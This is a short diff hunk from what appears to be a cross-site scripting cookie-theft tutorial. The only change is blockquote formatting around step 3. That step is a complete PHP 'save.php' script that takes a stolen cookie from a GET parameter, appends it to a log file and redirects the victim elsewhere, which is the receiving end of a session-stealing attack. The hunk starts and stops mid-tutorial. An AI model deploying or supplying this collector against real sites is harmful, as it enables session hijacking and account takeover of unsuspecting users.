@@ -44,12 +44,12 @@
 
 3. source code of save.php file is given below which would save the cookie into a text file
 
-     <?php
-     header('Location:https://yourdomain.com');
-     $cookies = $_GET["c"];
-     $file = fopen('logs.txt', 'a');
-     fwrite($file, $cookies . "\n\n");
-     ?>
+>     <?php
+>     header('Location:https://yourdomain.com');
+>     $cookies = $_GET["c"];
+>     $file = fopen('logs.txt', 'a');
+>     fwrite($file, $cookies . "\n\n");
+>     ?>
      
  4.
 
